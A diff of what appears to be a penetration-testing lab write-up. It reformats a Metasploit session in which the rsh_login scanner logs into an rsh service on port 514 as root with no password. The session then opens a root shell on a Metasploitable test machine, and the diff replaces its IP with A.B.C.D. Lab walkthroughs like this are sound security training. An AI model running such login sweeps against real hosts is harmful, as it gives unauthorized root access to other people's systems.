@@ -1,8 +1,8 @@
-## 514/tcp  open  tcpwrapped
+<pre>514/tcp  open  tcpwrapped</pre>
 
-msf6 > search rsh_login
+<pre>msf6 > search rsh_login</pre>
 
-Matching Modules
+<pre>Matching Modules
 ================
 
    #  Name                                   Disclosure Date  Rank    Check  Description
@@ -10,12 +10,13 @@ Matching Modules
    0  auxiliary/scanner/rservices/rsh_login  .                normal  No     rsh Authentication Scanner
 
 
-Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rservices/rsh_login
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rservices/rsh_login</pre>
 
-msf6 > use 0
-msf6 auxiliary(scanner/rservices/rsh_login) > show options 
+<pre>msf6 > use 0</pre>
 
-Module options (auxiliary/scanner/rservices/rsh_login):
+<pre>msf6 auxiliary(scanner/rservices/rsh_login) > show options</pre> 
+
+<pre>Module options (auxiliary/scanner/rservices/rsh_login):
 
    Name              Current Setting                                                 Required  Description
    ----              ---------------                                                 --------  -----------
@@ -41,35 +42,35 @@ Module options (auxiliary/scanner/rservices/rsh_login):
    USERPASS_FILE                                                                     no        File containing users and passwords separated by space, one pair per line
    USER_AS_PASS      false                                                           no        Try the username as the password for all users
    USER_FILE                                                                         no        File containing usernames, one per line
-   VERBOSE           true                                                            yes       Whether to print output for all attempts
+   VERBOSE           true                                                            yes       Whether to print output for all attempts</pre>
 
 
-View the full module info with the info, or info -d command.
+<pre>msf6 auxiliary(scanner/rservices/rsh_login) > set rhosts A.B.C.D</pre>
 
-msf6 auxiliary(scanner/rservices/rsh_login) > set rhosts 192.168.161.131
-rhosts => 192.168.161.131
-msf6 auxiliary(scanner/rservices/rsh_login) > set username root
-username => root
-msf6 auxiliary(scanner/rservices/rsh_login) > run
-[*] 192.168.161.131:514   - 192.168.161.131:514 - Starting rsh sweep
-[*] 192.168.161.131:514   - 192.168.161.131:514 - Attempting rsh with username 'root' from 'root'
-[+] 192.168.161.131:514   - 192.168.161.131:514, rsh 'root' from 'root' with no password.
-[!] 192.168.161.131:514   - No active DB -- Credential data will not be saved!
-[*] Command shell session 1 opened (0.0.0.0:1023 -> 192.168.161.131:514) at 2025-02-05 02:33:42 +0530
-[*] 192.168.161.131:514   - Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-msf6 auxiliary(scanner/rservices/rsh_login) > sessions 
+<pre>msf6 auxiliary(scanner/rservices/rsh_login) > set username root</pre>
 
-Active sessions
+<pre>msf6 auxiliary(scanner/rservices/rsh_login) > run</pre>
+
+<pre>[*] A.B.C.D:514   - A.B.C.D:514 - Starting rsh sweep
+[*] A.B.C.D:514   - A.B.C.D:514 - Attempting rsh with username 'root' from 'root'
+[+] A.B.C.D:514   - A.B.C.D:514, rsh 'root' from 'root' with no password.
+[!] A.B.C.D:514   - No active DB -- Credential data will not be saved!
+[*] Command shell session 1 opened (0.0.0.0:1023 ->  A.B.C.D:514 ) at 2025-02-05 02:33:42 +0530
+[*] A.B.C.D:514   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</pre>
+
+<pre>msf6 auxiliary(scanner/rservices/rsh_login) > sessions </pre>
+
+<pre>Active sessions
 ===============
 
   Id  Name  Type   Information                               Connection
   --  ----  ----   -----------                               ----------
-  1         shell  RSH root from root (192.168.161.131:514)  0.0.0.0:1023 -> 192.168.161.131:514 (192.168.161.131)
+  1         shell  RSH root from root ( A.B.C.D:514)         0.0.0.0:1023 ->  A.B.C.D:514 ( A.B.C.D)</pre>
 
-msf6 auxiliary(scanner/rservices/rsh_login) > sessions 1
-[*] Starting interaction with 1...
+<pre>msf6 auxiliary(scanner/rservices/rsh_login) > sessions 1</pre>
 
+<pre>[*] Starting interaction with 1...
 
 Shell Banner:
 sh: no job control in this shell
@@ -85,3 +86,4 @@ Linux
 sh-3.2# uname -a
 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
 sh-3.2# 
+</pre>
